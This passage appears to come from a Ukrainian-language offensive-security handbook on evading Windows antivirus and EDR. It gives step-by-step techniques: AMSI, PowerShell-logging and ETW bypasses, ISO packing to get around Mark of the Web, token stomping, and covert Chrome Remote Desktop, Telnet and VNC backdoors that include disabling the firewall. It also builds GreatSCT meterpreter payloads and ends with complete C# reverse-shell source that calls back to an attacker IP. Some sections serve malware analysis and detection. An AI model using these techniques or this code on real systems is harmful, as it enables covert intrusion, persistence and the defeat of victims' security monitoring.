Ви можете скористатися такими інструментами, як **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** і **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, щоб видалити виявлену сигнатуру AMSI з пам’яті поточного процесу. Цей інструмент сканує пам’ять поточного процесу на наявність сигнатури AMSI, а потім перезаписує її інструкціями NOP, фактично видаляючи її з пам’яті.

**Продукти AV/EDR, що використовують AMSI**

Список продуктів AV/EDR, що використовують AMSI, можна знайти тут: **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Використання PowerShell версії 2**
Якщо ви використовуєте PowerShell версії 2, AMSI не завантажуватиметься, тож ви зможете запускати скрипти без сканування AMSI. Ось як це зробити:

```bash
powershell.exe -version 2
```

## Журналювання PowerShell

Журналювання PowerShell — це функція, яка дає змогу записувати всі команди PowerShell, виконані в системі. Це може бути корисним для аудиту та усунення несправностей, але водночас може **стати проблемою для зловмисників, які хочуть уникнути виявлення**.

Щоб обійти журналювання PowerShell, можна скористатися такими методами:

- **Вимкнути PowerShell Transcription і Module Logging**: для цього можна скористатися таким інструментом, як [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Використовувати PowerShell версії 2**: якщо використовувати PowerShell версії 2, AMSI не завантажуватиметься, тож скрипти можна буде запускати без сканування AMSI. Це можна зробити так: `powershell.exe -version 2`
- **Використовувати некерований сеанс PowerShell**: скористайтеся [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), щоб розмістити PowerShell без запуску `powershell.exe` (саме такий підхід використовує `powerpick` у Cobalt Strike). Це дає змогу обійти засоби контролю, прив’язані саме до процесу `powershell.exe`, але саме по собі не вимикає AMSI, Script Block Logging чи всі інші засоби захисту PowerShell; рівень захисту залежить від середовища виконання та реалізації хоста.


## Obfuscation

> [!TIP]
> Кілька методів обфускації передбачають шифрування даних, що підвищить ентропію бінарного файла й полегшить його виявлення антивірусами та EDR. Будьте обережні: можливо, варто шифрувати лише певні фрагменти коду, які є чутливими або які потрібно приховати.

### Деобфускація .NET-бінарних файлів, захищених ConfuserEx

Під час аналізу шкідливого програмного забезпечення, у якому використовується ConfuserEx 2 (або комерційні форки), часто трапляються кілька рівнів захисту, що блокують декомпілятори й пісочниці. Наведений нижче робочий процес надійно **відновлює майже оригінальний IL**, який потім можна декомпілювати в C# за допомогою таких інструментів, як dnSpy або ILSpy.<sup>[[10]](#references)</sup>

1.  Видалення захисту від втручання — ConfuserEx шифрує кожне *тіло методу* й розшифровує його в статичному конструкторі *модуля* (`<Module>.cctor`). Також він змінює контрольну суму PE, тому будь-яка модифікація призведе до збою бінарного файла. Скористайтеся **AntiTamperKiller**, щоб знайти зашифровані таблиці метаданих, відновити XOR-ключі та переписати чисту збірку:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Вивід містить 6 anti-tamper параметрів (`key0-key3`, `nameHash`, `internKey`), які можуть стати в пригоді під час створення власного unpacker.

2.  Відновлення символів / потоку керування — передайте *clean* файл до **de4dot-cex** (форка de4dot із підтримкою ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Прапорці:
     • `-p crx` – вибрати профіль ConfuserEx 2
     • de4dot скасує заплутування потоку керування, відновить початкові простори імен, класи та назви змінних і розшифрує константні рядки.

3.  Proxy-call stripping – ConfuserEx замінює прямі виклики методів легковаговими обгортками (так званими *proxy calls*), щоб ще більше ускладнити декомпіляцію. Видаліть їх за допомогою **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Після цього кроку ви маєте побачити звичайні .NET API, як-от `Convert.FromBase64String` або `AES.Create()`, замість непрозорих функцій-обгорток (`Class8.smethod_10`, …).

4.  Ручне очищення — запустіть отриманий бінарний файл у dnSpy, шукайте великі Base64-дані або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб знайти *справжній* payload.  Часто malware зберігає його як TLV-кодований байтовий масив, ініціалізований усередині `<Module>.byte_0`.

Наведений вище ланцюжок відновлює потік виконання **без** запуску шкідливого зразка — корисно під час роботи на офлайн-робочій станції.

> 🛈  ConfuserEx створює користувацький атрибут `ConfusedByAttribute`, який можна використовувати як IOC для автоматичного сортування зразків.

#### Однорядкова команда
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — надати форк набору засобів компіляції [LLVM](http://www.llvm.org/) з відкритим вихідним кодом, здатний підвищити безпеку програмного забезпечення за допомогою [обфускації коду](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) і захисту від підробки.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати мову `C++11/14` для генерації обфускованого коду під час компіляції, без зовнішніх інструментів і змін компілятора.
- [**obfy**](https://github.com/fritzone/obfy): Додає шар обфускованих операцій, згенерованих фреймворком метапрограмування шаблонів C++, що трохи ускладнить життя тому, хто захоче зламати застосунок.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — це обфускатор x64-бінарних файлів, який може обфускувати різні PE-файли, зокрема .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — це простий рушій метаморфного коду для довільних виконуваних файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — це фреймворк детальної обфускації коду для мов, які підтримує LLVM, із використанням ROP (програмування, орієнтованого на повернення). ROPfuscator обфускує програму на рівні асемблерного коду, перетворюючи звичайні інструкції на ROP-ланцюжки та руйнуючи наше звичне уявлення про нормальний потік керування.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — це .NET PE Crypter, написаний на Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor може перетворювати наявні EXE/DLL на shellcode, а потім завантажувати їх

### Самомаскування окремих функцій за допомогою LLVM compiler

Замість того щоб маскувати весь implant лише під час простою, модифікований бекенд LLVM X86 може зберігати вибрані функції XOR-маскованими, коли вони неактивні. PoC Function Peekaboo вибирає деманглінговані імена, що містять `REG_`, вставляє незалежні від розташування початкові й кінцеві stub-и навколо фінального машинного коду та розміщує один спільний handler маскування в `.text`; сигнатури на рівні джерельного коду й угода виклику Windows x64 залишаються незмінними.<sup>[[38]](#references)[[39]](#references)</sup>

#### Перетворення потоку керування в бекенді

Це слід виконувати після вибору інструкцій та оптимізації, оскільки перетворення має охопити **кожну згенеровану інструкцію повернення** та знати точне компонування x86. `MachineFunctionPass`, що виконується перед виведенням, знаходить останню `MachineInstr::isReturn()`, видаляє її, щоб фінальний шлях переходив до доданого епілогу, а попередні інструкції повернення замінює на `JMP_1 handler`. Зберігайте будь-яке згенероване компілятором звільнення стека/кадру перед кожною інструкцією повернення; перенаправляйте лише саму інструкцію повернення.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` і `emitFunctionBodyEnd()` виводять початкові та кінцеві stub-и функції, а `emitEndOfAsmFile()` виводить handler. Символи, спільні для етапів виведення, дають змогу переходу з прологу вести до пізнішого епілогу; для вручну виведеного близького `je` запишіть `0F 84`, а потім чотирибайтовий MC-вираз `target - address_after_je`. Натомість виклики й переходи до handler можна вивести як об’єкти `MCInst` (`CALL64pcrel32` і `JMP_1`). Для невибраної функції pass має повертати `false`, якщо він нічого не змінив; у PoC на цьому шляху помилково повертається `true`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Метадані та ініціалізація перед CRT

PoC розміщує ключ XOR і 16-байтові записи, що містять покажчик на функцію з релокацією завантажувача та довжину часу виконання, у `.funcmeta`. Хоча поле C має тип `uint32_t`, handler читає QWORD зі зміщенням `+8` у записі, використовуючи довжину та її доповнення, і переходить до наступних записів із кроком `0x10`. Імена секцій PE мають довжину лише вісім байтів, тому під час пошуку в пам’яті бачимо `.funcmet`. Зовнішній patcher додає виконувану секцію `.stub`, зберігає старий RVA точки входу в stub і перенаправляє `AddressOfEntryPoint`; PIC-stub отримує базову адресу образу через `gs:[0x60]` → `[PEB+0x10]`, проходить таблицю імпортів PE32+, щоб знайти вже імпортовану `VirtualProtect`, і запускається до CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Під час ініціалізації в `gs:[0xE8]` встановлюється sentinel, після чого викликається кожна функція з метаданих. У постійно доступному для читання прологу записується початок функції в `gs:[0xF0]`, визначається sentinel і пропускається ще не замасковане тіло. Далі епілог використовує `call handler`; після того як handler зберігає 13 регістрів (`0x68` байтів), адреса повернення в `[rsp+0x68]` є кінцем перетвореної функції, тож `end - start` можна записати в її запис метаданих. Після маскування всіх тіл stub очищає sentinel і переходить за адресою `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Під час звичайного виклику пролог викликає той самий симетричний handler, щоб декодувати тіло. Фінальний шлях переходить до доданого епілогу, а кожне попереднє повернення переходить безпосередньо до спільного handler. Звичайний епілог також використовує `jmp handler`, а не `call`, тож після повторного маскування `ret` handler-а використовує адресу повернення початкового виклику й зберігає результат функції в `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Примітив маскування та індикатори аналізу

Handler знаходить поточний запис, пропускає фіксований видимий пролог (у цій збірці — `0x46` байтів), змінює захист решти області на `PAGE_EXECUTE_READWRITE`, виконує побайтовий XOR із молодшим байтом ключа, а потім встановлює захист `PAGE_EXECUTE_READ`. Отже, той самий цикл декодує тіло під час входу та кодує його під час кожного звичайного виходу.<sup>[[38]](#references)[[39]](#references)</sup>

До помітних індикаторів цієї схеми належать:<sup>[[38]](#references)[[39]](#references)</sup>

- точка входу всередині виконуваної секції `.stub` і секція `.funcmet`, що містить ключ і релоковані покажчики на `.text`;
- розбір PEB, таблиці імпортів і таблиці секцій до CRT, після чого виконуються виклики через кожен покажчик із метаданих;
- однакові PIC-прологи `call`/`pop` і численні місця повернення, перенаправлені до одного handler;
- записування в `gs:[0xE8]`, `gs:[0xF0]` і `gs:[0xF8]`, після чого відбуваються повторні зміни захисту через `VirtualProtect` і побайтове XOR-записування у виконувані сторінки, підкріплені образом.

Це ухилення від сканерів пам’яті, а не криптографічний захист: у пропатченому файлі й далі міститься початкове незашифроване тіло, а налагоджувач може встановити breakpoint на `VirtualProtect` або цикл XOR і зняти дамп активної функції. Однобайтовий XOR, відкриті для читання метадані й фіксована межа `0x46` також спрощують відновлення офлайн.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Слоти TEB у PoC є локальними для потоку, але модифіковані сторінки коду є спільними для процесу. Тому паралельний або рекурсивний вхід може перемикати інструкції, поки виконується інший виклик; винятки й нелокальні виходи також можуть обійти повторне маскування. Надійна реалізація має синхронізувати перемикання, відновлювати фактичний захист, отриманий через `lpflOldProtect`, уникати жорстко заданих довжин stub-ів, перевіряти шляхи `call` і `jmp` на дотримання вирівнювання стека x64, а також викликати `FlushInstructionCache` після перезапису виконуваних байтів. Microsoft прямо покладає на викликач відповідальність за узгодженість кешу інструкцій під час модифікації виконуваного коду.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Можливо, ви бачили це вікно під час завантаження з інтернету й запуску деяких виконуваних файлів.

Microsoft Defender SmartScreen — це механізм безпеки, призначений захищати кінцевого користувача від запуску потенційно шкідливих застосунків.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen переважно використовує підхід на основі репутації: рідко завантажувані застосунки викликають попередження SmartScreen, яке сповіщає кінцевого користувача й заважає запустити файл (хоча файл усе ще можна запустити, натиснувши More Info -> Run anyway).

**MoTW** (Mark of The Web) — це [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) з назвою Zone.Identifier, який автоматично створюється під час завантаження файлів з інтернету та містить URL-адресу джерела завантаження.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка ADS Zone.Identifier для файлу, завантаженого з інтернету.</p></figcaption></figure>

> [!TIP]
> Важливо зазначити, що виконувані файли, підписані **довіреним** сертифікатом підпису, **не викликають SmartScreen**.

Дуже ефективний спосіб не допустити, щоб ваші payload-и отримали Mark of The Web, — запакувати їх у контейнер, наприклад ISO. Це працює, оскільки Mark-of-the-Web (MOTW) **не можна** застосувати до томів **не NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — це інструмент для пакування payload-ів у вихідні контейнери, щоб обійти Mark-of-the-Web.

Приклад використання:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Це демонстрація обходу SmartScreen за допомогою пакування payloads у файли ISO через [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм ведення журналу у Windows, який дає змогу програмам і системним компонентам **реєструвати події**. Однак його також можуть використовувати засоби безпеки для моніторингу та виявлення зловмисної активності.

Так само, як AMSI можна вимкнути (обійти), можна змусити функцію **`EtwEventWrite`** процесу в user space негайно завершити роботу, не реєструючи жодних подій. Для цього функцію пропатчують у пам’яті, щоб вона негайно повертала керування, фактично вимикаючи ведення журналу ETW для цього процесу.

Докладніше можна дізнатися тут: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) і [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Рефлексія C#-збірок

Завантаження C#-бінарників у пам’ять відоме вже досить давно й досі є чудовим способом запускати свої post-exploitation інструменти, не потрапляючи на очі AV.

Оскільки payload завантажується безпосередньо в пам’ять, не торкаючись диска, нам потрібно лише подбати про патчинг AMSI для всього процесу.

Більшість C2-фреймворків (sliver, Covenant, metasploit, CobaltStrike, Havoc тощо) вже дають змогу виконувати C#-збірки безпосередньо в пам’яті, але є різні способи це зробити:

- **Fork\&Run**

Цей спосіб передбачає **створення нового процесу-приманки**, ін’єкцію в нього свого зловмисного post-exploitation коду, його виконання та завершення нового процесу після завершення роботи. Такий метод має свої переваги й недоліки. Перевага методу fork and run полягає в тому, що виконання відбувається **поза** процесом нашого Beacon-імпланта. Це означає, що якщо під час post-exploitation дій щось піде не так або їх буде виявлено, **імплант має значно більше шансів уціліти**. Недолік у тому, що **ймовірність виявлення** засобами **поведінкового виявлення** вища.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Цей спосіб передбачає ін’єкцію зловмисного post-exploitation коду **у власний процес**. Так можна уникнути створення нового процесу та його сканування засобами AV, але якщо під час виконання payload щось піде не так, **імовірність втратити свій beacon** значно вища, оскільки процес може аварійно завершитися.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Щоб дізнатися більше про завантаження C#-збірок, перегляньте цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) та BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Також можна завантажувати C#-збірки **з PowerShell**. Перегляньте [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) і [відео S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Перепакування інструментів .NET у WebAssembly за допомогою NativeAOT (WasmForge)

Звичайні методи `execute-assembly` зберігають упізнаваний MSIL і зрештою ініціалізують CLR. **WasmForge** натомість змінює середовище виконання: переносить C#-проєкт на експериментальну ціль NativeAOT-LLVM WASI, заздалегідь компілює його у WebAssembly і вбудовує цей модуль у Windows PE-хост на базі Wazero. Для роботи отриманого процесу не потрібні CLR, JIT або хост `dotnet` на цільовій системі, тому правила, що спираються лише на назви керованих збірок, завантаження CLR, AMSI або .NET ETW, втрачають пряму видимість. Це техніка ухилення та пакування, а не обхід межі привілеїв: гостьовий процес зберігає дозволи початкового інструмента та його спостережувану поведінку в ОС.<sup>[[44]](#references)[[45]](#references)</sup>

### Збирання C#-проєкту

Рекомендований спосіб збирання — Docker-середовище проєкту, оскільки воно містить .NET 10 SDK, NativeAOT-LLVM workload, WASI SDK 24.0, компонувальник і залежності для підписування. Файл `.csproj` визначається автоматично; одноетапне збирання виконує міграцію, патчинг сумісності, компіляцію у WASM, створення PE та підписування.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Для усунення неполадок або перевірки згенерованого коду розбийте процес на `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` і фінальну команду `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Образ збірки також використовує обгортку `wasm-component-ld`, щоб уникнути кодування компонента WASI Preview 2 і створити звичайний модуль, очікуваний вбудованим середовищем виконання.<sup>[[44]](#references)[[45]](#references)</sup>

### Міст між wasm32 C# і x64 Win32

Це не прозора перекомпіляція. У NativeAOT-WASI відсутні деякі функції BCL, орієнтовані на Windows, або вони працюють інакше, а гість wasm32 зазвичай виділяє чотирибайтові слоти вказівників, тоді як x64 API можуть повертати восьмибайтові вказівники. WasmForge розв'язує обидві проблеми за допомогою таких згенерованих шарів:<sup>[[44]](#references)</sup>

1. Патчер вихідного коду виправляє семантичні відмінності, специфічні для AOT, і перенаправляє непідтримувані виклики до реєстру, каналів, WMI, ідентифікації, служб каталогів, версії файлів, LSA та подібних компонентів до помічників `Wf*`.
2. Сканер P/Invoke створює зіставлення NativeAOT `DirectPInvoke`, щоб виклики `[DllImport]` прив'язувалися до скомпонованих символів мосту C, а не завантажували динамічно оголошену DLL усередині гостя.
3. Вказівники, прив'язані до хоста, використовують `ulong` у C# і `uint64_t` у C. Універсальний диспетчер передає виклик обробнику Win32 хоста; `out8_mask` позначає справжні восьмибайтові вихідні слоти, старші половини яких потрібно зберегти. Для вихідних даних, не позначених цим прапорцем, які мають формат wasm32, використовується захист зі знімком і відновленням, щоб запис x64 не пошкодив сусідні чотири байти.
4. Спеціалізовані мости хоста обробляють операції, що не підходять для універсальної диспетчеризації системних викликів, зокрема доступ до кешу квитків LSA, операції Kerberos/BCrypt зі структурованими результатами, TCP-трафік KDC і LDAP-запити.

Наприклад, обгортка для `version.dll!VerQueryValueW` передає чотири адреси хоста й встановлює біти 2 і 3 (`0xC`), оскільки вказівник на значення та довжина є восьмибайтовими вихідними слотами. Сама обгортка залишається універсальною та передає назву DLL, назву експорту, аргументи й маску до `wf_call_v2`; хост виконує перетворення вказівників і викликає нативний API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Обмеження та точки переходу для виявлення

Код із великою кількістю reflection, динамічне завантаження збірок, довільні native callbacks і складні структури x64, що повертаються в пам’ять WASM, усе ще можуть вимагати окремих патчів для кожного інструмента або взагалі не працювати. Універсальні сокети WASI Preview 2 також можуть доходити до заглушок no-op, тому для підтримуваних інструментів використовують host shims, специфічні для протоколу. Перевіряйте кожну команду порівняно з нативною збіркою, а не припускайте, що всі функції доступні.<sup>[[44]](#references)[[45]](#references)</sup>

Ця техніка змінює телеметрію, а не робить payload невидимим. Виявлення може зосередитися на PE, що містить або матеріалізує модуль WASM, поведінці runtime на кшталт Wazero, незвичному виділенні та копіюванні host/guest memory, універсальній прямій диспетчеризації Win32, аномаліях підпису та PE-ресурсів, а також на подальших викликах API і мережевому трафіку. Тому відсутність подій завантаження CLR, AMSI або .NET ETW не слід вважати доказом того, що процес нешкідливий.<sup>[[44]](#references)</sup>

## Використання інших мов програмування

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можна виконувати шкідливий код іншими мовами, надавши скомпрометованій машині доступ **до середовища інтерпретатора, встановленого на SMB-шарі, контрольованому зловмисником**.

Надавши доступ до бінарних файлів інтерпретатора та середовища на SMB-шарі, можна **виконувати довільний код цими мовами в пам’яті** скомпрометованої машини.

У репозиторії зазначено: Defender і далі сканує скрипти, але використання Go, Java, PHP тощо дає нам **більше гнучкості для обходу статичних сигнатур**. Тестування випадкових необфускованих скриптів reverse shell цими мовами виявилося успішним.

## Повторне розміщення WebAssembly для обходу статичного аналізу

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping змінює access token такого продукту безпеки, як EDR або AV. Зменшення привілеїв токена може залишити процес запущеним, водночас не дозволяючи йому виконувати привілейовані дії з перевірки або усунення загроз.

Щоб запобігти цьому, Windows могла б **не дозволяти зовнішнім процесам** отримувати handles до токенів процесів безпеки.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Використання довіреного ПЗ

### Chrome Remote Desktop

Як описано в [**цій публікації в блозі**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), достатньо легко розгорнути Chrome Remote Desktop на ПК жертви, а потім використати його, щоб отримати над ним контроль і закріпитися в системі:<sup>[[35]](#references)</sup>
1. Завантажте файл із https://remotedesktop.google.com/, натисніть "Set up via SSH", а потім виберіть MSI-файл для Windows, щоб завантажити його.
2. Запустіть інсталятор у тихому режимі на машині жертви (потрібні права адміністратора): `msiexec /i chromeremotedesktophost.msi /qn`
3. Поверніться на сторінку Chrome Remote Desktop і натисніть Next. Майстер запропонує пройти авторизацію; натисніть кнопку Authorize, щоб продовжити.
4. Виконайте надану команду, внісши потрібні зміни: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (параметр `--pin` задає PIN без використання GUI).
 

## Розширений обхід виявлення

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Обхід виявлення — дуже складна тема. Іноді потрібно враховувати багато різних джерел телеметрії в одній системі, тому в зрілих середовищах залишатися повністю непоміченим практично неможливо.

У кожного середовища, з яким ви працюватимете, будуть свої сильні та слабкі сторони.

Наполегливо раджу подивитися цю доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати початкове уявлення про розширені техніки обходу виявлення.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це також чудова доповідь від [@mariuszbit](https://twitter.com/mariuszbit) про багаторівневий обхід виявлення.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Старі техніки**

### **Перевірка, які частини Defender вважає шкідливими**

Можна використовувати [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який **видалятиме частини бінарного файла**, доки **не виявить, яку саме частину Defender** вважає шкідливою, а потім розділить її для вас.\
Ще один інструмент, що робить **те саме, —** [**avred**](https://github.com/dobin/avred), який пропонує цю послугу у відкритому вебсервісі [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows10 усі версії Windows постачалися з **Telnet server**, який можна було встановити (від імені адміністратора), виконавши:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Налаштуйте його так, щоб він **запускався** під час запуску системи, і **запустіть** його зараз:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Змініть порт telnet** (stealth) і вимкніть брандмауер:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Завантажте звідси: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (вам потрібні завантаження bin, а не інсталятор)

**НА ХОСТІ**: Запустіть _**winvnc.exe**_ і налаштуйте сервер:

- Увімкніть параметр _Disable TrayIcon_
- Установіть пароль у _VNC Password_
- Установіть пароль у _View-Only Password_

Потім перемістіть бінарний файл _**winvnc.exe**_ і **щойно** створений файл _**UltraVNC.ini**_ на **комп’ютер жертви**

#### **Зворотне підключення**

**Зловмисник** має **запустити на своєму** **хості** бінарний файл `vncviewer.exe -listen 5900`, щоб він був **готовий** прийняти зворотне **VNC-підключення**. Потім на **комп’ютері жертви** запустіть демон winvnc командою `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ПОПЕРЕДЖЕННЯ:** Щоб залишатися непомітним, не робіть кількох речей:

- Не запускайте `winvnc`, якщо він уже працює, інакше з’явиться [спливаюче вікно](https://i.imgur.com/1SROTTl.png). Перевірте, чи він запущений, командою `tasklist | findstr winvnc`
- Не запускайте `winvnc` без `UltraVNC.ini` у тій самій директорії, інакше відкриється [вікно налаштувань](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h`, щоб отримати довідку, інакше з’явиться [спливаюче вікно](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажте звідси: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

У GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Тепер **запустіть lister** за допомогою `msfconsole -r file.rc` і **виконайте** **xml payload** за допомогою:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Поточний Defender завершить процес дуже швидко.**

### Компіляція власного reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# Revershell

Скомпілюйте його за допомогою:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Використовуйте це з:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# за допомогою компілятора

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

